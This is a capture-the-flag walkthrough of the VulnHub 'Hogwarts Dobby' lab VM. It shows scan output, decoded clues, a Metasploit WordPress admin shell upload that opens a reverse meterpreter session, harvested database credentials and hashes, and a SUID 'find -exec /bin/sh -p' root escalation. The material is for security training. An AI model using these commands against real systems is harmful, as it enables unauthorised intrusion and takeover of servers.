# BOX NAME: Hogwarts Dobby
**LINK**: https://www.vulnhub.com/entry/hogwarts-dobby,597/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate box, find clues.
2. Locate wp-admin, log in, tamper, get revshell
3. Enumerate locally, pivot to dobby user.
4. leverage SUID binary to get root
5. SCORE!

Fun box. took me longer than i expected but hey, I was simultaneously watching bond "No Time To Die", so hey.
also, I missed the second SUID. so, anyways!
Great stuff and I got it eventually! 

Great days!
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.93
[+] URL:	http://10.77.0.93
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dobby.log                                                     
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-28 21:42 CEST
Nmap scan report for 10.77.0.93
Host is up (0.00045s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-server-header: Apache/2.4.46 (Ubuntu)
|_http-title: Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb $URL --log-verbose=true | tee whatweb-dobby.log
http://10.77.0.93 [200 OK] Apache[2.4.46], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.46 (Ubuntu)], IP[10.77.0.93], Title[Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==]



└─$ hURL -b 'dG9vIGVhc3kgbm8/IFBvdHRlcg=='
Original string       :: dG9vIGVhc3kgbm8/IFBvdHRlcg==
base64 DEcoded string :: too easy no? Potter
```

nikto-scan
```
└─$ nikto -h $URL | tee nikto-dobby.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.93
+ Target Hostname:    10.77.0.93
+ Target Port:        80
+ Start Time:         2023-06-28 21:42:49 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.46 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /: Server may leak inodes via ETags, header found with file /, inode: 2ae1, size: 5b3957e06e486, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.46 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552
+ 8102 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2023-06-28 21:43:19 (GMT2) (30 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```
pass:OjppbGlrZXNvY2tz
::ilikesocks

hint --> /DiagonAlley
```
other
```
<!-- see /alohomora -->
http://10.77.0.93/alohomora/
-> "Draco's password is his house ;)"" 
```
```

+++++ +++++ [->++ +++++ +++<] >.<++ +[->+ ++<]> ++.<+ ++[-> —<] >—-
..<++ ++[-> ++++< ]>+++ ++++. <++++ [->– –<]> .<+++ [->++ +<]>+ .<+++ +[->- —<] >–.< ++++[ ->+++ +<]>+ +++.- -.<++ +[->- –<]> —– .<+++ [->++ +<]>+ +++.<
==

donn§
Memory:
[1] = § (167)
```

```
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Deep Scan Results  [+] 

 ┏━Target: 10.77.0.93
 ┃
 ┠── CMS: WordPress
 ┃    │
 ┃    ├── Version: 5.5.3
 ┃    ╰── URL: https://wordpress.org
 ┃
 ┠──[WordPress Deepscan]
 ┃    │
 ┃    ├── Readme file found: http://10.77.0.93/DiagonAlley/readme.html
 ┃    ├── License file: http://10.77.0.93/DiagonAlley/license.txt
 ┃    │
 ┃    ├── Themes Enumerated: 1
 ┃    │    │
 ┃    │    ╰── Theme: amphibious
 ┃    │        │
 ┃    │        ├── Version: 5.5.3
 ┃    │        ╰── URL: http://10.77.0.93/DiagonAlley/wp-content/themes/amphibious
 ┃    │
 ┃    │
 ┃    ├── Usernames harvested: 1
 ┃    │    ╰── draco
 ┃    │
 ┃
 ┠── Result: /home/jml/Result/10.77.0.93_DiagonAlley/cms.json
 ┃
 ┗━Scan Completed in 1.17 Seconds, using 45 Requests



 CMSeeK says ~ adeus


```
```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.77.0.88:4444 
[*] Authenticating with WordPress using draco:slytherin...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /DiagonAlley/wp-content/plugins/bPDXpQFkEd/CmWEdpNgnY.php...
[*] Sending stage (39927 bytes) to 10.77.0.93
[+] Deleted CmWEdpNgnY.php
[+] Deleted bPDXpQFkEd.php
[+] Deleted ../bPDXpQFkEd
[*] Meterpreter session 1 opened (10.77.0.88:4444 -> 10.77.0.93:40106) at 2023-06-28 22:44:33 +0200

meterpreter > sysinfo
Computer    : HogWarts
OS          : Linux HogWarts 5.8.0-26-generic #27-Ubuntu SMP Wed Oct 21 22:29:16 UTC 2020 x86_64
Meterpreter : php/linux

``` 
</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```

```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1.
2.
3.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```

```

**SUID's**:

```
www-data@HogWarts:/home/dobby/Descargas/nmap-4.53$ find / -perm -u=s -type f 2>/dev/null
/snap/core22/766/usr/bin/chfn
/snap/core22/766/usr/bin/chsh
/snap/core22/766/usr/bin/gpasswd
/snap/core22/766/usr/bin/mount
/snap/core22/766/usr/bin/newgrp
/snap/core22/766/usr/bin/passwd
/snap/core22/766/usr/bin/su
/snap/core22/766/usr/bin/sudo
/snap/core22/766/usr/bin/umount
/snap/core22/766/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core22/766/usr/lib/openssh/ssh-keysign
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/core18/2785/bin/mount
/snap/core18/2785/bin/ping
/snap/core18/2785/bin/su
/snap/core18/2785/bin/umount
/snap/core18/2785/usr/bin/chfn
/snap/core18/2785/usr/bin/chsh
/snap/core18/2785/usr/bin/gpasswd
/snap/core18/2785/usr/bin/newgrp
/snap/core18/2785/usr/bin/passwd
/snap/core18/2785/usr/bin/sudo
/snap/core18/2785/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2785/usr/lib/openssh/ssh-keysign
/snap/core18/1932/bin/mount
/snap/core18/1932/bin/ping
/snap/core18/1932/bin/su
/snap/core18/1932/bin/umount
/snap/core18/1932/usr/bin/chfn
/snap/core18/1932/usr/bin/chsh
/snap/core18/1932/usr/bin/gpasswd
/snap/core18/1932/usr/bin/newgrp
/snap/core18/1932/usr/bin/passwd
/snap/core18/1932/usr/bin/sudo
/snap/core18/1932/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1932/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/libexec/sssd/ldap_child
/usr/libexec/sssd/p11_child
/usr/libexec/sssd/krb5_child
/usr/libexec/sssd/proxy_child
/usr/libexec/sssd/selinux_child
/usr/sbin/pppd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/base32
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/fusermount
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
```
**SGID's**:

```
www-data@HogWarts:/home/dobby/Descargas/nmap-4.53$ find / -perm -g=s -type f 2>/dev/null
/snap/core22/766/usr/bin/chage
/snap/core22/766/usr/bin/expiry
/snap/core22/766/usr/bin/ssh-agent
/snap/core22/766/usr/bin/wall
/snap/core22/766/usr/sbin/pam_extrausers_chkpwd
/snap/core22/766/usr/sbin/unix_chkpwd
/snap/core18/2785/sbin/pam_extrausers_chkpwd
/snap/core18/2785/sbin/unix_chkpwd
/snap/core18/2785/usr/bin/chage
/snap/core18/2785/usr/bin/expiry
/snap/core18/2785/usr/bin/ssh-agent
/snap/core18/2785/usr/bin/wall
/snap/core18/1932/sbin/pam_extrausers_chkpwd
/snap/core18/1932/sbin/unix_chkpwd
/snap/core18/1932/usr/bin/chage
/snap/core18/1932/usr/bin/expiry
/snap/core18/1932/usr/bin/ssh-agent
/snap/core18/1932/usr/bin/wall
/usr/libexec/camel-lock-helper-1.2
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/bin/ssh-agent
/usr/bin/crontab
/usr/bin/chage
/usr/bin/expiry
/usr/bin/write.ul
/usr/bin/wall
/usr/lib/xorg/Xorg.wrap
```
**OTHERS**:

```
www-data@HogWarts:/var/www/html/DiagonAlley$ grep 'DB' wp-config.php
define( 'DB_NAME', 'WordPressDB' );
define( 'DB_USER', 'Draco' );
define( 'DB_PASSWORD', 'slytherin' );
define( 'DB_HOST', 'localhost' );
define( 'DB_CHARSET', 'utf8' );
define( 'DB_COLLATE', '' );
```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5f8ccaaa9c0f41640ccbc461b10f2308db7dbda1, for GNU/Linux 3.2.0, stripped
 

No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 20.10
Release:        20.10
Codename:       groovy


Linux HogWarts 5.8.0-26-generic #27-Ubuntu SMP Wed Oct 21 22:29:16 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password
Wordpress 	-> 		Draco:slytherin
Mysql 		->		Draco:slytherin

```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
+----+------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+                                
| ID | user_login | user_pass                          | user_nicename | user_email            | user_url                     | user_registered     | user_activation_key | user_status | display_name |                                
+----+------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+                                
|  1 | Draco      | $P$BRCid7BFuDrkeGvhXqzoSw6yoM4k1I/ | draco         | DracoMalfoy@gmail.com | http://localhost/DiagonAlley | 2020-11-07 19:11:47 |                     |           0 | Draco        |                                
+----+------------+------------------------------------+---------------+-----------------------+------------------------------+---------------------+---------------------+-------------+--------------+ 

$6$5zBywVON/Qj/78Yb$ac1hoOn/S/CwZEzl2JZQkKGhkL9N40bV9TJgjF7l3tKSbvGdHrnonYrYfLjF6mwmWrGEojmidvIrrfHEWqSgv.:ilikesocks
```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
dobby@HogWarts:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=1000(dobby) gid=1000(dobby) euid=0(root) grupos=1000(dobby),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),132(lxd),133(sambashare)
# whoami
root
```

```
"Harry potter this year should not go to the school of wizardry"
flag1{28327a4964cb391d74111a185a5047ad}
```

```
                                         _ __
        ___                             | '  \
   ___  \ /  ___         ,'\_           | .-. \        /|
   \ /  | |,'__ \  ,'\_  |   \          | | | |      ,' |_   /|
 _ | |  | |\/  \ \ |   \ | |\_|    _    | |_| |   _ '-. .-',' |_   _
// | |  | |____| | | |\_|| |__    //    |     | ,'_`. | | '-. .-',' `. ,'\_
\\_| |_,' .-, _  | | |   | |\ \  //    .| |\_/ | / \ || |   | | / |\  \|   \
 `-. .-'| |/ / | | | |   | | \ \//     |  |    | | | || |   | | | |_\ || |\_|
   | |  | || \_| | | |   /_\  \ /      | |`    | | | || |   | | | .---'| |
   | |  | |\___,_\ /_\ _      //       | |     | \_/ || |   | | | |  /\| |
   /_\  | |           //_____//       .||`      `._,' | |   | | \ `-' /| |
        /_\           `------'        \ |   AND        `.\  | |  `._,' /_\
                                       \|       THE          `.\
                                            _  _  _  _  __ _  __ _ /_
                                           (_`/ \|_)/ '|_ |_)|_ |_)(_
                                           ._)\_/| \\_,|__| \|__| \ _)
                                                           _ ___ _      _
                                                          (_` | / \|\ ||__
                                                          ._) | \_/| \||___


root{63a9f0ea7bb98050796b649e85481845!!}

```

</details>